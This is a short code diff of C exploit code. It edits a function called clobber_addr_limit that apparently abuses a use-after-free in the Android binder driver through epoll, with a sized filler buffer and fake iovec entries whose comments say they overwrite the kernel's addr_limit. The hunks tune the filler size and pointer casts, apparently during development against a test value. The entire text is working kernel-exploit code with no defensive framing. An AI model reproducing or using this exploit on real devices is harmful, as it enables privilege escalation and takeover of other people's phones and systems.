@@ -160,8 +160,8 @@ void clobber_addr_limit(void)
   char* uafFill = malloc(UAF_SPINLOCK);
   if (uafFill == NULL) err(1, "allocating uafFill");
   memset(uafFill, 0xC4, UAF_SPINLOCK);
-  char testFill[128]; // 600-WAITQUEUE_OFFSET-16];
-  for (int i=0;i<sizeof(testFill);i++) testFill[i]=0;
+  char testFill[568-WAITQUEUE_OFFSET-16]; // 600-WAITQUEUE_OFFSET-16];
+  for (int i=0;i<sizeof(testFill);i++) testFill[i]=i;
     
   struct epoll_event event = { .events = EPOLLIN };
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
@@ -172,8 +172,8 @@ void clobber_addr_limit(void)
   
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
-    sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
-    &testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    sizeof(testFill)*1, /* iov_len (currently in use) */  // wq->task_list->prev
+    (unsigned long)&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
   memcpy(testFill, second_write_chunk, sizeof(second_write_chunk));
